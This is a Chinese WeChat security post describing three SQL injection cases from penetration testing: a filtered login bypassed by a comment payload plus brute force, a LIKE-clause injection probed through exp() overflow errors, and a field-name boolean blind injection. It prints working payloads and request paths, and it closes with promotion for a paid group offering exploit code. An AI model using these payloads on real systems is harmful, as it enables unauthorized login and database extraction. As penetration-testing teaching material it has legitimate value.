> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492891&idx=1&sn=53e633cb9ea05a797b761d7ff2e09629

#  【攻防演练】SQL注入——猎奇案例篇  
0x1eeA  神农Sec   2025-07-10 01:02  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。  
#   
  
文章作者：0x1eeA  
  
文章来源：https://www.freebuf.com/articles/web/430960.html  
  
  
**案例一：高防护下的万能密码**  
  
  
  
入手点就是这个登录页面了  
  
![1747184937_6823ed29e35b2bc1c2157.jpg!small?1747184938852](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBgVf7T79Il0bibe7NAiaftQ8dDpjHISDdI5Y3nmzKLgw2iaUOAMh4cH3gw/640?wx_fmt=jpeg&from=appmsg "")  
  
账号密码随便输入，抓包  
  
![1747184962_6823ed42b9144bd52446e.jpg!small?1747184963467](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBfCx7NrHKx7h3GAkBDJRAicQhnsAwthg1EHm6eN9uQ3BRo3BL4h6icGsA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
ln为用户名，pwd为密码。ln参数加个单引号试试。  
  
![1747184973_6823ed4df341f4faca556.jpg!small?1747184974827](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBRamgdiatKFmB0GKbGcQkYSibvL6yLMXCDP6NmgDdP4NlIAiaFSHNcaic2Q/640?wx_fmt=jpeg&from=appmsg "")  
  
发现500了，这明显有问题啊，再加一个单引号。  
  
![1747184987_6823ed5be5ab83cbdeff0.jpg!small?1747184988798](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibB37tVZe4koOMIGdv62MRjolnNhcYcPVr3KPd8ZQ5g5WicLGZlSia8RicgQ/640?wx_fmt=jpeg&from=appmsg "")  
  
实锤了，这位置存在SQL注入漏洞。登录接口，直接使用万能密码尝试绕过登录。  
  
![1747185004_6823ed6c053b6df42e110.jpg!small?1747185007419](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBtVPYjGyFTia6LLDvDsgILooPjaUntysbVqkOQE4mbYcLgq4sbMKkIsg/640?wx_fmt=jpeg&from=appmsg "")  
  
发现直接没返回包了，不妙啊，感觉请求像是被设备识别关键字拦截掉了。尝试发现设备几乎对所有重要的关键词都设防了，各种绕过方式均以失败告终。  
  
那是否存在一条万能密码payload可以在不使用关键词的前提下成功绕过登录？ 有的兄弟，有的！！  
  
![1747185025_6823ed81a4d2200e5fa0d.png!small?1747185026333](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBw0hvnxdkdqKh1KOf5qQ8G07bEWQKibrN5zaHQnxNp6bwzsMnQun2Snw/640?wx_fmt=jpeg&from=appmsg "")  
  

```
ln=admin';--+-
```

  
  
![1747185045_6823ed953df4798e01d1f.jpg!small?1747185045749](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBD2amdBQStUOnmFvJK5tiaLWr7NDLCLcpLjia3ZQh0WLOJNoPAYTNDLNg/640?wx_fmt=jpeg&from=appmsg "")  
  
咦？竟然没进去，看来还是得研究下这个payload原理。  
  
小雷猜测该处的SQL语法是这样的。  

```
select * from user where username=.'$ln'. and password=.'$pwd';
```

  
当小雷的payload打进去，语法就变成了  

```
select * from user where username='admin';--+-' and password='123456';
其实也就是：
select * from user where username='admin';
```

  
也就是目前payload让原本校验用户名和密码的SQL语句变成了只校验用户名，但是为什么没进去？  
  
答案是：系统不存在admin用户，接下来就简单了，直接爆破admin这个位置。  
  
![1747185065_6823eda9b0f1d8f7d05b8.jpg!small?1747185066681](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBkv2glNEVlQTFMkyVPX2DaHhtFNibLkJw9IMpo1svCYl4pmhjY9iaob9Q/640?wx_fmt=jpeg&from=appmsg "")  
  
![1747185072_6823edb0919d79755b6d7.jpg!small?1747185073614](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBib0yo5WDqARpqZhHFgpiaPqD7MESblFXyAdEL92u3aibk25Jpw7icnM6ibg/640?wx_fmt=jpeg&from=appmsg "")  
  
![1747185080_6823edb821cb6594623fc.jpg!small?1747185080748](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBzUcQTJh7SDss92pE7jQpfhy9BDibpNmKFaxeK8t0NCs3GMK7XjRkcGA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
可见，系统的安全不能完全依仗设备。  
  
  
**案例二：LIKE注入**  
  
  
  
入手点依旧是一个平平无奇的登录页面  
  
![1747185100_6823edcc19d42146e34ac.jpg!small?1747185100628](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBcyJicdlDpVePyACOu6U16Tk37l4wbn5M2PuhaWPniccsWRM6vqiadz3iaw/640?wx_fmt=jpeg&from=appmsg "")  
  
通过爆破成功登录，在管理员管理位置抓到一个数据包。  
  
![1747185114_6823edda15e02d1c20081.jpg!small?1747185116039](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBVpmMFqYq5iaGC4icswdhiaYyaqAUyZrPmfMGeviaFaQGwK86R9Nt9KwMKQ/640?wx_fmt=jpeg&from=appmsg "")  
  
roles参数加单引号  
  
![1747185144_6823edf86ebf0a1d79203.jpg!small?1747185145689](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBlIjqbKEoOiamn963snBdeLrkTtibDHicS483FbOMYoxZURPn1O7I9HVlQ/640?wx_fmt=jpeg&from=appmsg "")  
  
直接丢给sqlmap，参数拉到最高竟然没跑出来，看来又得演示手法了。  
  
![1747185165_6823ee0d43211ce55edb3.png!small?1747185165769](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBqVr2W5kkG38vsm9dXM3T2ibqQ216jhibIj8eyxpXq0ibjNk61U6xa1J1Q/640?wx_fmt=jpeg&from=appmsg "")  
  
先把SQL语句扣下来，格式化下语法结构。  

```
SELECT * 
FROM 
`eb_system_admin` 
WHERE
( CONCAT(',',roles,',')  LIKE '%,111111111111',%' )  
AND
`is_del` = :ThinkBind_1_114815451_  
AND
`level` = :ThinkBind_2_293448294_ LIMIT 0,20 
```

  
像这种LIKE注入一定要注意他原本的格式，先把注入点前后语法补齐，然后插入
```
and
```

  
或者
```
or
```

  
。  
  
先补齐前后语法，通过AND配合语法格式在注入点将语句前后都补齐。  
  

```
aaaaaaaa,%')+AND+(CONCAT(',',roles,',')+LIKE+'%,aaaaaaaa
```

  

```
SELECT * 
FROM 
`eb_system_admin` 
WHERE
(CONCAT(',',roles,',') LIKE '%,aaaaaaaa,%')
AND 
(CONCAT(',',roles,',') LIKE '%,aaaaaaaa,%')  
AND
`is_del` = :ThinkBind_1_114815451_  
AND
`level` = :ThinkBind_2_293448294_ LIMIT 0,20 
```

  
完美，我们把payload赋给roles参数，发包看一下。  
  
![1747185194_6823ee2a6bff3bd8e33fd.jpg!small?1747185196106](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibB61G49H8TFbx3m2qhwKQ02dERU7jwanFsUrfMWGNMUcg91Os4OFpXRw/640?wx_fmt=jpeg&from=appmsg "")  
  
不报错了，说明前后语法已经被完美闭合。接下来，我们再加一个AND，  
  

```
aaaaaaaa,%')+AND+1+LIKE+1+AND+(CONCAT(',',roles,',')+LIKE+'%,aaaaaaaa
```

  

```
SELECT * 
FROM 
`eb_system_admin` 
WHERE
(CONCAT(',',roles,',') LIKE '%,aaaaaaaa,%')
AND 
1 LIKE 1
AND
(CONCAT(',',roles,',') LIKE '%,aaaaaaaa,%')  
AND
`is_del` = :ThinkBind_1_114815451_  
AND
`level` = :ThinkBind_2_293448294_ LIMIT 0,20 
```

  
再把payload带入发包。  
  
![1747185210_6823ee3a25197131646a5.jpg!small?1747185210850](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBiaXZyxbVxicOV0fKTOAibKrCgibZazW94VhroyibXvoiaYaVtAafhl4sW5LA/640?wx_fmt=jpeg&from=appmsg "")  
  
然后进一步修改payload，利用exp()函数特性进行SQL注入  
  

```
aaaaaaaa,%')+AND+1+LIKE+1+AND+(CONCAT(',',roles,',')+LIKE+'%,aaaaaaaa
```

  
  
-->  
  

```
aaaaaaaa,%')+AND+1+LIKE+exp(709)+AND+(CONCAT(',',roles,',')+LIKE+'%,aaaaaaaa
```

  
无报错  
  
![1747185226_6823ee4a6dc9be6406586.jpg!small?1747185227325](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBVYSZB5oficibicwpzcXTjZtK1h0kpib8CeNjMXGiboHeNicBfxBuSZcHWPLQ/640?wx_fmt=jpeg&from=appmsg "")  
  
-->  
  

```
aaaaaaaa,%')+AND+1+LIKE+exp(710)+AND+(CONCAT(',',roles,',')+LIKE+'%,aaaaaaaa
```

  
报错  
  
![1747185240_6823ee58dec64124e89eb.jpg!small?1747185242209](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBTCKzdZ8eZrVTu9I0vYic0AliaPy40ia5IKz7ShY3dAWurKAjKWBkzLKBw/640?wx_fmt=jpeg&from=appmsg "")  
  
这是因为在mysql中exp()函数的参数值大于709时会抛出一个溢出异常。  
  
根据此特性构造payload  
  

```
/adminapi/setting/admin?roles=aaaaaaaa,%')+AND+1+LIKE+exp(999-length(version()))+AND+(CONCAT(',',roles,',')+LIKE+'%,aaaaaaaa
```

  
  
主要是这里  
  

```
exp(999-length(version()))
```

  
，fuzz "999"的位置，直到不报错。  
  
最终发现，当"999"的位置替换为719时，不报错；当"999"的位置替换为720时系统报错。  
  
![1747185258_6823ee6a5b4253a93760d.jpg!small?1747185259813](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBA9Oj0uRGWo9Qg2EXy7ibzgNCcdR11eKKwZzDoRt7na1LD9yM4ZqAM5Q/640?wx_fmt=jpeg&from=appmsg "")  
  
![1747185265_6823ee7113bd20ad91c94.jpg!small?1747185266085](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBptUmnBWrF147vueGZ6Nlf5tib9B3Fd3ibntVhI4j9zAxicQHPfGl81I5g/640?wx_fmt=jpeg&from=appmsg "")  
  
也就是
```
720-length(version() = 710
```

  
，所以当前数据库版本的长度为10。  
  
点到为止，下一个下一个。  
  
![1747185292_6823ee8c0d5397f9f1725.png!small?1747185292453](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBozRzUDzZsZsx2LCmD5qQ2Jw9nORzyaibgc2K9UjN7In6XTPJQUxolGg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
**案例三：字段名注入**  
  
  
  
依然是朴实无华的登录页面。  
  
![1747185307_6823ee9b6966d8d1d8962.jpg!small?1747185309087](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBTJ4N571nJGTLL6V1EEAFbUsKXVX61Dib4lnd1XJQrh5zmnQb6KvYz0g/640?wx_fmt=jpeg&from=appmsg "")  
  
通过朴实无华的fuzz大法登录系统，在用户管理处抓包。  
  

```
value
```

  
就是我们输入的内容。  
  
![1747185320_6823eea8f2431bdc8944d.jpg!small?1747185322342](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBWjVKUE06ZXrayHcmJLg0tiafAoQXjvLrjfE1SpJTAxONzoCbTuhyYFg/640?wx_fmt=jpeg&from=appmsg "")  
  
测试发现value参数并无注入漏洞，field参数加单引号回显包状态码会500。  
  
![1747185337_6823eeb9a0bf5c04d92a9.jpg!small?1747185338347](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBUG9pI3h6t5s3hZeEhxDHT1FhbV5eO7YFXbgfPW26NlzG04Ohc91GFQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
再加一个单引号，直接爆出了SQL语句。  
  
![1747185351_6823eec703071e0e97b33.jpg!small?1747185352096](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBkndom4YHwPVF0iclAnAyZ6xLDN81M6SrW7icEC1dMTxbEorR40LBv01w/640?wx_fmt=jpeg&from=appmsg "")  
  
sqlmap参数拉到最高，依然没跑出来。  
  
把SQL语句抠出来，格式化。  

```
SELECT count(*) as id   
 FROM 
 account      
 WHERE  
 (account.username LIKE ?)
```

  
有代码基础的兄弟一看到这个SQL语句就明白为啥
```
value
```

  
参数没有注入漏洞了，典型预编译写法，看来程序员还是有一定安全意识的。  
  
仔细观察返回包参数和SQL语法。  
  
![1747185368_6823eed8dc9c8df41178a.jpg!small?1747185370072](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBSQDDibK8QbTuGickSwr1GNKxbJFGSMk5k2TdAP7jr3hdhbIrHZ5x1Xgw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
而我们主要要看的就是
```
field
```

  
参数，
```
field
```

  
参数被拼接到了字段名中。  
  
还是跟上面一样，先把注入点前后语法补齐。  
  

```
username like '1') and (1
```

  

```
SELECT count(*) as id   
 FROM 
 account      
 WHERE  
 (account.username like '1')
 and
 (1 like LIKE ?)
```

  
带入发包。  
  
![1747185386_6823eeea29b9832e81554.jpg!small?1747185387111](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBtHibGoYtAsHoUZoGahpt1LBf8DYcthT6qaC8icSWvKovDg0wcKkItvSw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
没报错，说明语法被完美闭合了。因为这个功能是查询用户，所以我们可以通过
```
or
```

  
进行布尔盲注。  
  

```
username like '1') or 1=1 and (1
```

  
长度1388  
  
![1747185401_6823eef9e9c6c7d12c417.jpg!small?1747185402644](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBtzESTewEcgWKfXouZS899L83qX5iagAv3Y0d5lZcnOcDt8l4W7qhzpg/640?wx_fmt=jpeg&from=appmsg "")  
  

```
username like '1') or 1=2 and (1
```

  
长度339  
  
![1747185415_6823ef077bb0cc0032a30.jpg!small?1747185416129](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBibmyQFSoVh86Fma9NxLsJSX2X4OGKaCpr9cIgbCW2ic2yZKKbYNpvS3Q/640?wx_fmt=jpeg&from=appmsg "")  
  
构造payload  
  

```
username like '1') or n=length(user()) and (1
```

  
  
当n=length(user()) 时，也就是n为当前数据库用户名长度时，返回包长度为1388  
  
![1747185430_6823ef164783000b2b813.jpg!small?1747185431141](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXB4gLbciaqUMetw3YufLSibBMrw5zK09lBc1cSmjwu3yAENftQZH2052UbKEX1IHuXeFTkwmXKDsvA/640?wx_fmt=jpeg&from=appmsg "")  
  
最终爆破出用户名长度为14，依然是点到为止。  
  
  
**内部小圈子详情介绍**  
  
  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  

```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```

  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
星球现价   
￥45元  
  
如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
  
星球人数少于1000人 45元/年  
  
星球人数少于1200人 65元/年  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXYSHg6L72Acqz6CcxdTTR72ic6bOSuMibJkYgVvibYfvrIwxESqR5TL8qrZhUQicKTUGeOic4VMibicF6Mw/640?wx_fmt=png&from=appmsg "")  
  
欢迎加入星球一起交流，券后价仅45元！！！ 即将满1000人涨价  
  
长期  
更新，更多的0day/1day漏洞POC/EXP  
  
  
  
**内部知识库--**  
**（持续更新中）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=png&from=appmsg "")  
  
  
内部小圈子——  
圈友反馈  
（  
良心价格  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXYSHg6L72Acqz6CcxdTTR7Fotibpcs8XRn33xic5cMHaRIVPPBX9pJynCUQ7II1kBnsQCfzwXSToMw/640?wx_fmt=jpeg&from=appmsg "")  
  
    

```
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
